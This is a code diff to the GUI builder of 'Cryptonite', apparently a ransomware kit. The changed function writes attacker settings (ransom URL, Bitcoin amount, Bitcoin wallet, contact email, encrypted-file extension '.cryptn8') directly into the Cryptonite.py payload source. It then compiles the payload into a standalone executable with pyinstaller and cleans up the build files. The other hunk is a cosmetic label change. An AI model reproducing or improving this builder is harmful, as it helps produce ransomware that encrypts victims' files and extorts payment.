@@ -36,8 +36,15 @@ def generate():
         "EMAIL": email_entry.get(),
         "EXT": ext_entry.get().replace(".", "")
     }
-    with open("creds.json", "w") as f:
-        json.dump(configDict, f)
+    with open("Cryptonite.py", "r") as f:
+        text = f.read()
+        text = text.replace("URL = \"\"", f"URL = \"{configDict['URL']}\"")
+        text = text.replace("BTC_AMOUNT = \"\"", f"BTC_AMOUNT = \"{configDict['BTC_AMOUNT']}\"")
+        text = text.replace("BTC_WALLET = \"\"", f"BTC_WALLET = \"{configDict['BTC_WALLET']}\"")
+        text = text.replace("EMAIL = \"\"", f"EMAIL = \"{configDict['EMAIL']}\"")
+        text = text.replace("EXT = \"\"", f"EXT = \".{configDict['EXT']}\"")
+    with open("Cryptonite.py", "w") as f:
+        f.write(text)
     os.system(f"pyinstaller --onefile --clean --icon=\"icon.ico\" Cryptonite.py --name {FILE}")
     if OS == "nt":
         os.system(f"MOVE /Y \".\\dist\\{FILE}.exe\" \"{PATH}\" && rmdir /Q /S __pycache__ build dist && del /Q {FILE}.spec")
@@ -109,7 +116,7 @@ ext_entry = tk.Entry(window, font = ("arial", 15), fg = "black", bg = "#C6C6C6")
 ext_entry.grid(row = 6, column = 1, sticky = "w", pady = 20, padx = 15)
 ext_entry.insert("0", ".cryptn8")
 
-ext = tk.Label(master = window, text = "", font = ("arial", 15))
+ext = tk.Label(master = window, text = "", font = ("arial", 15), bg = "white")
 ext.grid(row = 7, column = 0, sticky = "e", pady = 5, padx = 15)
 
 folder_frm = tk.Label(master = window, text = f"..Folder path will appear here..", font = ("arial", 12))
